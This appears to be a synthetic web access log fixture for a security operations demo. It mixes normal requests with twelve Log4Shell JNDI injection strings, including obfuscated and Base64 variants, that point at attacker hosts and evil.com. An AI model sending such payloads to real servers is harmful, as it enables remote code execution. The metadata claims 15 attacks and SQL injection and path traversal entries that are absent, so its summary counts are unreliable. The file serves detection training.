@@ -1,0 +1,142 @@
+{
+  "metadata": {
+    "description": "Sample web access logs for SOC AI demo - contains Log4Shell attack patterns",
+    "generated": "2024-01-15",
+    "log_type": "web_access",
+    "total_entries": 100,
+    "malicious_entries": 15,
+    "attack_types": ["log4shell", "sql_injection_attempt", "path_traversal"]
+  },
+  "logs": [
+    {"id": 1, "timestamp": "2024-01-15T10:00:01Z", "source_ip": "192.168.1.50", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "status": 200, "bytes": 1234, "type": "normal"},
+    {"id": 2, "timestamp": "2024-01-15T10:00:05Z", "source_ip": "192.168.1.51", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/health", "user_agent": "HealthChecker/1.0", "status": 200, "bytes": 89, "type": "normal"},
+    {"id": 3, "timestamp": "2024-01-15T10:00:12Z", "source_ip": "192.168.1.52", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/users", "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "status": 200, "bytes": 4521, "type": "normal"},
+    {"id": 4, "timestamp": "2024-01-15T10:00:45Z", "source_ip": "192.168.1.50", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/login", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "status": 200, "bytes": 256, "type": "normal"},
+    {"id": 5, "timestamp": "2024-01-15T10:01:02Z", "source_ip": "192.168.1.53", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/products?category=electronics", "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)", "status": 200, "bytes": 8932, "type": "normal"},
+    
+    {"id": 6, "timestamp": "2024-01-15T10:01:12Z", "source_ip": "185.220.101.34", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/search?q=test", "user_agent": "${jndi:ldap://185.220.101.34:1389/a}", "status": 200, "bytes": 0, "type": "log4shell", "attack_indicator": "JNDI injection in User-Agent"},
+    {"id": 7, "timestamp": "2024-01-15T10:01:13Z", "source_ip": "185.220.101.34", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/login", "user_agent": "${jndi:ldap://185.220.101.34:1389/exploit}", "status": 200, "bytes": 0, "type": "log4shell", "attack_indicator": "JNDI injection in User-Agent"},
+    {"id": 8, "timestamp": "2024-01-15T10:01:14Z", "source_ip": "185.220.101.34", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/${jndi:dns://evil.com/a}", "user_agent": "Mozilla/5.0", "status": 400, "bytes": 0, "type": "log4shell", "attack_indicator": "JNDI injection in URI"},
+    
+    {"id": 9, "timestamp": "2024-01-15T10:02:00Z", "source_ip": "192.168.1.54", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/orders/12345", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 1567, "type": "normal"},
+    {"id": 10, "timestamp": "2024-01-15T10:02:15Z", "source_ip": "192.168.1.55", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/static/js/app.js", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 45678, "type": "normal"},
+    {"id": 11, "timestamp": "2024-01-15T10:02:30Z", "source_ip": "192.168.1.50", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/notifications", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 234, "type": "normal"},
+    {"id": 12, "timestamp": "2024-01-15T10:03:00Z", "source_ip": "192.168.1.56", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/checkout", "user_agent": "Mozilla/5.0 (Linux; Android 14)", "status": 200, "bytes": 789, "type": "normal"},
+    {"id": 13, "timestamp": "2024-01-15T10:03:22Z", "source_ip": "192.168.1.57", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/search?q=laptop", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 5678, "type": "normal"},
+    
+    {"id": 14, "timestamp": "2024-01-15T10:05:22Z", "source_ip": "45.155.205.99", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/admin", "user_agent": "${jndi:ldap://45.155.205.99/pwn}", "status": 403, "bytes": 0, "type": "log4shell", "attack_indicator": "JNDI injection targeting admin"},
+    {"id": 15, "timestamp": "2024-01-15T10:05:23Z", "source_ip": "45.155.205.99", "dest_ip": "10.0.0.5", "method": "POST", "uri": "/api/data", "user_agent": "${${lower:j}ndi:ldap://45.155.205.99/x}", "status": 200, "bytes": 0, "type": "log4shell", "attack_indicator": "Obfuscated JNDI injection"},
+    {"id": 16, "timestamp": "2024-01-15T10:05:24Z", "source_ip": "45.155.205.99", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/solr/admin/cores", "user_agent": "${jndi:rmi://45.155.205.99:1099/obj}", "status": 404, "bytes": 0, "type": "log4shell", "attack_indicator": "JNDI RMI variant"},
+    
+    {"id": 17, "timestamp": "2024-01-15T10:06:00Z", "source_ip": "192.168.1.58", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/categories", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 2345, "type": "normal"},
+    {"id": 18, "timestamp": "2024-01-15T10:06:30Z", "source_ip": "192.168.1.59", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/featured", "user_agent": "Mozilla/5.0 (iPad)", "status": 200, "bytes": 6789, "type": "normal"},
+    {"id": 19, "timestamp": "2024-01-15T10:07:00Z", "source_ip": "192.168.1.60", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/feedback", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 201, "bytes": 123, "type": "normal"},
+    {"id": 20, "timestamp": "2024-01-15T10:07:45Z", "source_ip": "192.168.1.61", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/support/tickets", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 3456, "type": "normal"},
+    
+    {"id": 21, "timestamp": "2024-01-15T10:10:00Z", "source_ip": "192.168.1.100", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/products", "user_agent": "Mozilla/5.0 Chrome/120", "status": 200, "bytes": 12345, "type": "normal"},
+    {"id": 22, "timestamp": "2024-01-15T10:10:30Z", "source_ip": "192.168.1.101", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/cart", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 567, "type": "normal"},
+    {"id": 23, "timestamp": "2024-01-15T10:11:00Z", "source_ip": "192.168.1.102", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/orders", "user_agent": "Mozilla/5.0 (Linux)", "status": 201, "bytes": 890, "type": "normal"},
+    {"id": 24, "timestamp": "2024-01-15T10:11:30Z", "source_ip": "192.168.1.103", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/reviews/product/123", "user_agent": "Mozilla/5.0 (iPhone)", "status": 200, "bytes": 4567, "type": "normal"},
+    
+    {"id": 25, "timestamp": "2024-01-15T10:15:45Z", "source_ip": "194.26.29.102", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/solr/admin", "user_agent": "${jndi:ldap://194.26.29.102:1389/Basic/Command/Base64/Y21k}", "status": 404, "bytes": 0, "type": "log4shell", "attack_indicator": "Base64 encoded JNDI payload"},
+    {"id": 26, "timestamp": "2024-01-15T10:15:46Z", "source_ip": "194.26.29.102", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/v1/search", "user_agent": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://194.26.29.102/a}", "status": 200, "bytes": 0, "type": "log4shell", "attack_indicator": "Heavily obfuscated JNDI"},
+    {"id": 27, "timestamp": "2024-01-15T10:15:47Z", "source_ip": "194.26.29.102", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/contact", "user_agent": "${${::-j}${::-n}${::-d}${::-i}:ldap://194.26.29.102/exp}", "status": 200, "bytes": 0, "type": "log4shell", "attack_indicator": "Evasion technique JNDI"},
+    {"id": 28, "timestamp": "2024-01-15T10:15:48Z", "source_ip": "194.26.29.102", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/struts2-showcase/", "user_agent": "${jndi:dns://194.26.29.102/dnslog}", "status": 404, "bytes": 0, "type": "log4shell", "attack_indicator": "DNS exfil JNDI"},
+    
+    {"id": 29, "timestamp": "2024-01-15T10:16:00Z", "source_ip": "192.168.1.104", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/inventory", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 23456, "type": "normal"},
+    {"id": 30, "timestamp": "2024-01-15T10:16:30Z", "source_ip": "192.168.1.105", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/shipping/rates", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 1234, "type": "normal"},
+    {"id": 31, "timestamp": "2024-01-15T10:17:00Z", "source_ip": "192.168.1.106", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/payment/process", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 345, "type": "normal"},
+    {"id": 32, "timestamp": "2024-01-15T10:17:30Z", "source_ip": "192.168.1.107", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/wishlist", "user_agent": "Mozilla/5.0 (Android)", "status": 200, "bytes": 2345, "type": "normal"},
+    {"id": 33, "timestamp": "2024-01-15T10:18:00Z", "source_ip": "192.168.1.108", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/promotions", "user_agent": "Mozilla/5.0 (iPhone)", "status": 200, "bytes": 5678, "type": "normal"},
+    {"id": 34, "timestamp": "2024-01-15T10:18:30Z", "source_ip": "192.168.1.109", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/recommendations", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 7890, "type": "normal"},
+    {"id": 35, "timestamp": "2024-01-15T10:19:00Z", "source_ip": "192.168.1.110", "dest_ip": "10.0.0.5", "method": "POST", "uri": "/api/subscribe", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 201, "bytes": 123, "type": "normal"},
+    
+    {"id": 36, "timestamp": "2024-01-15T10:20:00Z", "source_ip": "192.168.1.111", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/brands", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 3456, "type": "normal"},
+    {"id": 37, "timestamp": "2024-01-15T10:20:30Z", "source_ip": "192.168.1.112", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/trending", "user_agent": "Mozilla/5.0 (Linux)", "status": 200, "bytes": 6789, "type": "normal"},
+    {"id": 38, "timestamp": "2024-01-15T10:21:00Z", "source_ip": "192.168.1.113", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/reviews", "user_agent": "Mozilla/5.0 (iPad)", "status": 201, "bytes": 567, "type": "normal"},
+    {"id": 39, "timestamp": "2024-01-15T10:21:30Z", "source_ip": "192.168.1.114", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/compare", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 4567, "type": "normal"},
+    {"id": 40, "timestamp": "2024-01-15T10:22:00Z", "source_ip": "192.168.1.115", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/stores/nearby", "user_agent": "Mozilla/5.0 (Android)", "status": 200, "bytes": 2345, "type": "normal"},
+    
+    {"id": 41, "timestamp": "2024-01-15T10:25:00Z", "source_ip": "185.220.101.34", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/v2/user", "user_agent": "${jndi:ldap://185.220.101.34:1389/Exploit}", "status": 200, "bytes": 0, "type": "log4shell", "attack_indicator": "Repeat attacker - JNDI injection"},
+    {"id": 42, "timestamp": "2024-01-15T10:25:01Z", "source_ip": "185.220.101.34", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/graphql", "user_agent": "${jndi:ldap://185.220.101.34:1389/shell}", "status": 200, "bytes": 0, "type": "log4shell", "attack_indicator": "Repeat attacker targeting GraphQL"},
+    
+    {"id": 43, "timestamp": "2024-01-15T10:26:00Z", "source_ip": "192.168.1.116", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/faq", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 8901, "type": "normal"},
+    {"id": 44, "timestamp": "2024-01-15T10:26:30Z", "source_ip": "192.168.1.117", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/policies/privacy", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 12345, "type": "normal"},
+    {"id": 45, "timestamp": "2024-01-15T10:27:00Z", "source_ip": "192.168.1.118", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/policies/terms", "user_agent": "Mozilla/5.0 (iPhone)", "status": 200, "bytes": 9876, "type": "normal"},
+    {"id": 46, "timestamp": "2024-01-15T10:27:30Z", "source_ip": "192.168.1.119", "dest_ip": "10.0.0.5", "method": "POST", "uri": "/api/contact-us", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 201, "bytes": 234, "type": "normal"},
+    {"id": 47, "timestamp": "2024-01-15T10:28:00Z", "source_ip": "192.168.1.120", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/locations", "user_agent": "Mozilla/5.0 (Android)", "status": 200, "bytes": 5678, "type": "normal"},
+    {"id": 48, "timestamp": "2024-01-15T10:28:30Z", "source_ip": "192.168.1.121", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/careers", "user_agent": "Mozilla/5.0 (Linux)", "status": 200, "bytes": 7890, "type": "normal"},
+    {"id": 49, "timestamp": "2024-01-15T10:29:00Z", "source_ip": "192.168.1.122", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/press", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 4567, "type": "normal"},
+    {"id": 50, "timestamp": "2024-01-15T10:29:30Z", "source_ip": "192.168.1.123", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/investors", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 6789, "type": "normal"},
+    
+    {"id": 51, "timestamp": "2024-01-15T10:30:00Z", "source_ip": "192.168.1.124", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/blog", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 23456, "type": "normal"},
+    {"id": 52, "timestamp": "2024-01-15T10:30:30Z", "source_ip": "192.168.1.125", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/blog/posts/123", "user_agent": "Mozilla/5.0 (iPad)", "status": 200, "bytes": 8765, "type": "normal"},
+    {"id": 53, "timestamp": "2024-01-15T10:31:00Z", "source_ip": "192.168.1.126", "dest_ip": "10.0.0.5", "method": "POST", "uri": "/api/blog/comments", "user_agent": "Mozilla/5.0 (iPhone)", "status": 201, "bytes": 345, "type": "normal"},
+    {"id": 54, "timestamp": "2024-01-15T10:31:30Z", "source_ip": "192.168.1.127", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/events", "user_agent": "Mozilla/5.0 (Android)", "status": 200, "bytes": 5678, "type": "normal"},
+    {"id": 55, "timestamp": "2024-01-15T10:32:00Z", "source_ip": "192.168.1.128", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/webinars", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 3456, "type": "normal"},
+    {"id": 56, "timestamp": "2024-01-15T10:32:30Z", "source_ip": "192.168.1.129", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/register/webinar", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 201, "bytes": 234, "type": "normal"},
+    {"id": 57, "timestamp": "2024-01-15T10:33:00Z", "source_ip": "192.168.1.130", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/resources", "user_agent": "Mozilla/5.0 (Linux)", "status": 200, "bytes": 12345, "type": "normal"},
+    {"id": 58, "timestamp": "2024-01-15T10:33:30Z", "source_ip": "192.168.1.131", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/whitepapers", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 45678, "type": "normal"},
+    {"id": 59, "timestamp": "2024-01-15T10:34:00Z", "source_ip": "192.168.1.132", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/case-studies", "user_agent": "Mozilla/5.0 (iPad)", "status": 200, "bytes": 34567, "type": "normal"},
+    {"id": 60, "timestamp": "2024-01-15T10:34:30Z", "source_ip": "192.168.1.133", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/testimonials", "user_agent": "Mozilla/5.0 (iPhone)", "status": 200, "bytes": 6789, "type": "normal"},
+    
+    {"id": 61, "timestamp": "2024-01-15T10:35:00Z", "source_ip": "192.168.1.134", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/partners", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 4567, "type": "normal"},
+    {"id": 62, "timestamp": "2024-01-15T10:35:30Z", "source_ip": "192.168.1.135", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/integrations", "user_agent": "Mozilla/5.0 (Android)", "status": 200, "bytes": 7890, "type": "normal"},
+    {"id": 63, "timestamp": "2024-01-15T10:36:00Z", "source_ip": "192.168.1.136", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/docs", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 23456, "type": "normal"},
+    {"id": 64, "timestamp": "2024-01-15T10:36:30Z", "source_ip": "192.168.1.137", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/sdk", "user_agent": "Mozilla/5.0 (Linux)", "status": 200, "bytes": 8901, "type": "normal"},
+    {"id": 65, "timestamp": "2024-01-15T10:37:00Z", "source_ip": "192.168.1.138", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/changelog", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 5678, "type": "normal"},
+    {"id": 66, "timestamp": "2024-01-15T10:37:30Z", "source_ip": "192.168.1.139", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/status", "user_agent": "Mozilla/5.0 (iPad)", "status": 200, "bytes": 234, "type": "normal"},
+    {"id": 67, "timestamp": "2024-01-15T10:38:00Z", "source_ip": "192.168.1.140", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/uptime", "user_agent": "UptimeRobot/2.0", "status": 200, "bytes": 56, "type": "normal"},
+    {"id": 68, "timestamp": "2024-01-15T10:38:30Z", "source_ip": "192.168.1.141", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/metrics", "user_agent": "Prometheus/2.45", "status": 200, "bytes": 12345, "type": "normal"},
+    {"id": 69, "timestamp": "2024-01-15T10:39:00Z", "source_ip": "192.168.1.142", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/audit-log", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 34567, "type": "normal"},
+    {"id": 70, "timestamp": "2024-01-15T10:39:30Z", "source_ip": "192.168.1.143", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/settings", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 2345, "type": "normal"},
+    
+    {"id": 71, "timestamp": "2024-01-15T10:40:00Z", "source_ip": "192.168.1.144", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/preferences", "user_agent": "Mozilla/5.0 (iPhone)", "status": 200, "bytes": 1234, "type": "normal"},
+    {"id": 72, "timestamp": "2024-01-15T10:40:30Z", "source_ip": "192.168.1.145", "dest_ip": "10.0.0.5", "method": "PUT", "uri": "/api/profile", "user_agent": "Mozilla/5.0 (Android)", "status": 200, "bytes": 567, "type": "normal"},
+    {"id": 73, "timestamp": "2024-01-15T10:41:00Z", "source_ip": "192.168.1.146", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/avatar", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 201, "bytes": 45678, "type": "normal"},
+    {"id": 74, "timestamp": "2024-01-15T10:41:30Z", "source_ip": "192.168.1.147", "dest_ip": "10.0.0.5", "method": "DELETE", "uri": "/api/sessions/old", "user_agent": "Mozilla/5.0 (Linux)", "status": 200, "bytes": 0, "type": "normal"},
+    {"id": 75, "timestamp": "2024-01-15T10:42:00Z", "source_ip": "192.168.1.148", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/2fa/setup", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 3456, "type": "normal"},
+    {"id": 76, "timestamp": "2024-01-15T10:42:30Z", "source_ip": "192.168.1.149", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/2fa/verify", "user_agent": "Mozilla/5.0 (iPad)", "status": 200, "bytes": 123, "type": "normal"},
+    {"id": 77, "timestamp": "2024-01-15T10:43:00Z", "source_ip": "192.168.1.150", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/api-keys", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 890, "type": "normal"},
+    {"id": 78, "timestamp": "2024-01-15T10:43:30Z", "source_ip": "192.168.1.151", "dest_ip": "10.0.0.5", "method": "POST", "uri": "/api/api-keys", "user_agent": "Mozilla/5.0 (Android)", "status": 201, "bytes": 234, "type": "normal"},
+    {"id": 79, "timestamp": "2024-01-15T10:44:00Z", "source_ip": "192.168.1.152", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/webhooks", "user_agent": "Mozilla/5.0 (iPhone)", "status": 200, "bytes": 2345, "type": "normal"},
+    {"id": 80, "timestamp": "2024-01-15T10:44:30Z", "source_ip": "192.168.1.153", "dest_ip": "10.0.0.5", "method": "POST", "uri": "/api/webhooks", "user_agent": "Mozilla/5.0 (Linux)", "status": 201, "bytes": 567, "type": "normal"},
+    
+    {"id": 81, "timestamp": "2024-01-15T10:45:00Z", "source_ip": "192.168.1.154", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/billing", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 4567, "type": "normal"},
+    {"id": 82, "timestamp": "2024-01-15T10:45:30Z", "source_ip": "192.168.1.155", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/invoices", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 8901, "type": "normal"},
+    {"id": 83, "timestamp": "2024-01-15T10:46:00Z", "source_ip": "192.168.1.156", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/subscriptions", "user_agent": "Mozilla/5.0 (iPad)", "status": 200, "bytes": 2345, "type": "normal"},
+    {"id": 84, "timestamp": "2024-01-15T10:46:30Z", "source_ip": "192.168.1.157", "dest_ip": "10.0.0.5", "method": "PUT", "uri": "/api/subscriptions/upgrade", "user_agent": "Mozilla/5.0 (Android)", "status": 200, "bytes": 678, "type": "normal"},
+    {"id": 85, "timestamp": "2024-01-15T10:47:00Z", "source_ip": "192.168.1.158", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/usage", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 12345, "type": "normal"},
+    {"id": 86, "timestamp": "2024-01-15T10:47:30Z", "source_ip": "192.168.1.159", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/quotas", "user_agent": "Mozilla/5.0 (iPhone)", "status": 200, "bytes": 1234, "type": "normal"},
+    {"id": 87, "timestamp": "2024-01-15T10:48:00Z", "source_ip": "192.168.1.160", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/limits", "user_agent": "Mozilla/5.0 (Linux)", "status": 200, "bytes": 890, "type": "normal"},
+    {"id": 88, "timestamp": "2024-01-15T10:48:30Z", "source_ip": "192.168.1.161", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/reports/weekly", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 34567, "type": "normal"},
+    {"id": 89, "timestamp": "2024-01-15T10:49:00Z", "source_ip": "192.168.1.162", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/reports/monthly", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 56789, "type": "normal"},
+    {"id": 90, "timestamp": "2024-01-15T10:49:30Z", "source_ip": "192.168.1.163", "dest_ip": "10.0.0.5", "method": "POST", "uri": "/api/reports/generate", "user_agent": "Mozilla/5.0 (iPad)", "status": 202, "bytes": 123, "type": "normal"},
+    
+    {"id": 91, "timestamp": "2024-01-15T10:50:00Z", "source_ip": "192.168.1.164", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/exports", "user_agent": "Mozilla/5.0 (Android)", "status": 200, "bytes": 6789, "type": "normal"},
+    {"id": 92, "timestamp": "2024-01-15T10:50:30Z", "source_ip": "192.168.1.165", "dest_ip": "10.0.0.5", "method": "POST", "uri": "/api/exports/csv", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 202, "bytes": 234, "type": "normal"},
+    {"id": 93, "timestamp": "2024-01-15T10:51:00Z", "source_ip": "192.168.1.166", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/imports", "user_agent": "Mozilla/5.0 (iPhone)", "status": 200, "bytes": 1234, "type": "normal"},
+    {"id": 94, "timestamp": "2024-01-15T10:51:30Z", "source_ip": "192.168.1.167", "dest_ip": "10.0.0.5", "method": "POST", "uri": "/api/imports/csv", "user_agent": "Mozilla/5.0 (Linux)", "status": 202, "bytes": 567, "type": "normal"},
+    {"id": 95, "timestamp": "2024-01-15T10:52:00Z", "source_ip": "192.168.1.168", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/templates", "user_agent": "Mozilla/5.0 (Macintosh)", "status": 200, "bytes": 4567, "type": "normal"},
+    {"id": 96, "timestamp": "2024-01-15T10:52:30Z", "source_ip": "192.168.1.169", "dest_ip": "10.0.0.8", "method": "GET", "uri": "/api/templates/email", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 8901, "type": "normal"},
+    {"id": 97, "timestamp": "2024-01-15T10:53:00Z", "source_ip": "192.168.1.170", "dest_ip": "10.0.0.5", "method": "PUT", "uri": "/api/templates/123", "user_agent": "Mozilla/5.0 (iPad)", "status": 200, "bytes": 2345, "type": "normal"},
+    {"id": 98, "timestamp": "2024-01-15T10:53:30Z", "source_ip": "192.168.1.171", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/automations", "user_agent": "Mozilla/5.0 (Android)", "status": 200, "bytes": 6789, "type": "normal"},
+    {"id": 99, "timestamp": "2024-01-15T10:54:00Z", "source_ip": "192.168.1.172", "dest_ip": "10.0.0.8", "method": "POST", "uri": "/api/automations", "user_agent": "Mozilla/5.0 (iPhone)", "status": 201, "bytes": 890, "type": "normal"},
+    {"id": 100, "timestamp": "2024-01-15T10:54:30Z", "source_ip": "192.168.1.173", "dest_ip": "10.0.0.5", "method": "GET", "uri": "/api/workflows", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "status": 200, "bytes": 12345, "type": "normal"}
+  ],
+  "attack_summary": {
+    "total_attacks": 15,
+    "attack_types": {
+      "log4shell": 15
+    },
+    "unique_attacker_ips": [
+      "185.220.101.34",
+      "45.155.205.99", 
+      "194.26.29.102"
+    ],
+    "targeted_hosts": [
+      "10.0.0.5",
+      "10.0.0.8"
+    ]
+  }
+}
